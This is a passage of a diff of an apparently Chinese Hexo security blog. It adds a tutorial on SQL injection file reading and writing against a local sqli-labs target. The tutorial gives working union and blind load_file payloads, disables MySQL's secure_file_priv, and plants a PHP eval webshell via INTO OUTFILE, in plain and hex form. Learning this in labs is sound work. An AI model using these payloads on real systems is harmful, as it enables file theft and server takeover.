jia;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-更改表名"><a href="#2-更改表名" class="headerlink" title="2. 更改表名"></a>2. 更改表名</h2><ul>
-<li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code>​</li>
-<li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code>​</li>
-</ul>
-<h2 id="3-handle"><a href="#3-handle" class="headerlink" title="3.handle"></a>3.handle</h2><ul>
-<li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/" data-id="cmawcq0ne003ork7k5wsydm7b" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" data-id="cmawczpoi003pik7k8j4odz8a" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -417,7 +235,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/" data-id="cmawcq0ng003urk7k5b3b6un6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/Cookie%20%E6%B3%A8%E5%85%A5/" data-id="cmawczpoi003sik7kath777uw" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -456,7 +274,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" data-id="cmawcq0ni0042rk7kbojx8kr5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" data-id="cmawczpom0043ik7kbuam4247" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -527,7 +345,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="cmawcq0ni0045rk7k9kx337b9" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" data-id="cmawczpoo0045ik7k3cooarl8" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -557,7 +375,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nj0048rk7kga1t4a9w" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" data-id="cmawczpop0046ik7kfz91269o" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -627,7 +445,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmawcq0nr004mrk7kge0n4tpx" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" data-id="cmawczpop0047ik7k0dd90ya3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -737,7 +555,104 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="cmawcq0ns004nrk7kff4udihi" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" data-id="cmawczpop0048ik7k346rdt7h" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/sql注入总结/文件读写" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><h3 id="1-union-注入读取文件"><a href="#1-union-注入读取文件" class="headerlink" title="1. union 注入读取文件"></a>1. union 注入读取文件</h3><hr>
+<p><strong>注</strong>：当有显示列的时候，文件读可以利用 union 注入。当没有显示列的时候，只能利用盲注进行数据读取；</p>
+<p>文件写入只能利用 union 注入</p>
+<p>示例：读取系统根目录下的&#x2F;demo.txt 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//union注入读取 /demo.txt 文件,windows使用-&gt;盘符:/路径</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,load_file(&quot;demo.txt&quot;) -- +</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//也可以把 /demo.txt 转换成16进制 这里没成功，可以去找找资料。。。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,2,load_file(0x2F64656D6F2E747874) -- +</span><br></pre></td></tr></table></figure>
+
+<p>如果不成功，参考以下解决方案 在 mysql 目录中找到 my.ini&#x2F;my.cnf 文件在[mysqld]下面添加如下内容secure_file_priv &#x3D; “”如图：</p>
+<p>登录 mysql 执行以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SHOW VARIABLES LIKE <span class="string">&quot;secure_file_priv&quot;</span>;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>secure_file_priv</code>​的值要为””或者 “&#x2F;“ secure_file_priv 有三个值</p>
+<p>1、限制 mysqld 不允许导入 | 导出</p>
+<p>​<code>mysqld –secure_file_prive=null</code>​</p>
+<p>2、限制 mysqld 的导入 | 导出 只能发生在&#x2F;tmp&#x2F;目录下</p>
+<p>​<code>mysqld –secure_file_priv=/tmp/</code>​</p>
+<p>3、不对 mysqld 的导入 | 导出做限制</p>
+<p>​<code>secure_file_priv=&#39;&#39;</code>​</p>
+<hr>
+<h3 id="2-盲注读取文件"><a href="#2-盲注读取文件" class="headerlink" title="2. 盲注读取文件"></a>2. 盲注读取文件</h3><hr>
+<p>盲注读取的话就是利用hex函数，将读取的字符串转换成 16 进制，再利用ascii函数，转换成 ascii 码，再利用二分法一个一个的判断字符，很复杂，一般结合工具完成</p>
+<p>​<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; and ascii(mid((select hex(load_file(&#39;e:/3.txt&#39;))),18,1))&gt;49#&#39; LIMIT 0,1</code>​</p>
+<p>我们可以利用写入文件的功能，在 e 盘创建 4.php 文件，然后写入一句话木马。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//利用union注入写入一句话木马 into outfile 和 into dumpfile 都可以</span><br><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,&#x27;</span>&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[aaa]);?&gt;<span class="string">&#x27; into outfile &#x27;</span>d:/4.php<span class="string">&#x27; -- +</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 可以将一句话木马转换成16进制的形式</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-1/?id=-1&#x27;</span> union <span class="keyword">select</span> 1,2,0x3c3f70687020406576616c28245f504f53545b6161615d293b3f3e into outfile <span class="string">&#x27;d:/4.php&#x27;</span> -- +</span><br></pre></td></tr></table></figure>
+
+<p>在文件写入读取的时候，遇见以下这种情况。</p>
+<p><img src="/.com//image-20250519092519-0kcit26.png" alt="image"></p>
+<p>多半是因为权限不足，可以使用@@datadir，得到当前数据库存储目录，试着在数据库存储目录进行文件注入 比如</p>
+<p>​<code>http://192.168.209.128:88/Less-1/?id=-1&#39; union select 1,2,&#39;&lt;?php @eval($_POST[aaa]);?&gt;&#39; into outfile &#39;/www/server/mysql/4.php&#39; --</code>​</p>
+<p><img src="/.com//image-20250519092538-50xr08l.png" alt="image"></p>
+<p>注入成功</p>
+<p><strong>权限不足的解决办法-参考</strong>环境： CentOS7.0 64 位 MySQL5.7 问题：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用&#x27;select into outfile&#x27;备份数据表提示无法写入文件</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> 1,2,<span class="string">&#x27;you are very good hacker&#x27;</span> from  into outfile <span class="string">&#x27;/www/server/mysql/app.txt&#x27;</span>;</span><br><span class="line">ERROR 1 (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/www/server/mysql/app.txt<span class="string">&#x27; (Errcode: 13)</span></span><br></pre></td></tr></table></figure>
+
+<p>排查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看mysql的进程用户,为mysql用户</span></span><br><span class="line">[root@lfs ~]# ps aux|grep mysqld</span><br><span class="line">root       1400  0.0  0.1 108208  1612 ?        S    01:22   0:00 /bin/sh /usr/local/mysql/bin/mysqld_safe --user=mysql</span><br><span class="line">mysql      1778  0.0  6.6 974276 67076 ?        Sl   01:22   0:06 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/lfs.err --pid-file=/usr/local/mysql/data/lfs.pid --socket=/tmp/mysql.sock --port=3306</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看/www/server/mysql/目录的权限，mysql用户没有写入权限</span></span><br><span class="line">[root@lfs ~]# <span class="built_in">ls</span> -ld /www/server/mysql/</span><br><span class="line">drwxr-xr-x 4 root root 4096 Aug 23 17:03 /www/server/mysql/</span><br></pre></td></tr></table></figure>
+
+<p>解决办法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将/data/mysql/目录的归属为mysql用户</span></span><br><span class="line"><span class="built_in">chown</span> -R mysql.mysql /www/server/mysql/</span><br><span class="line"></span><br><span class="line">[root@lfs ~]# <span class="built_in">ls</span> -ld /data/mysql/</span><br><span class="line">drwxr-xr-x 4 mysql mysql 4096 Aug 23 17:03 /www/server/mysql/</span><br></pre></td></tr></table></figure>
+
+<p>验证，写入成功：</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/" data-id="cmawczpor004cik7k9e2s2fkz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[GYCTF2020]Blacklist" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5BGYCTF2020%5DBlacklist/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[GYCTF2020]Blacklist/" data-id="cmawczpos004eik7k9dnl89lv" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -774,7 +689,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
     </div>
   </div>
 
@@ -784,7 +699,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
     </div>
   </div>
 
@@ -793,7 +708,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
     </div>
   </div>
 
@@ -806,11 +721,11 @@
       <ul>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
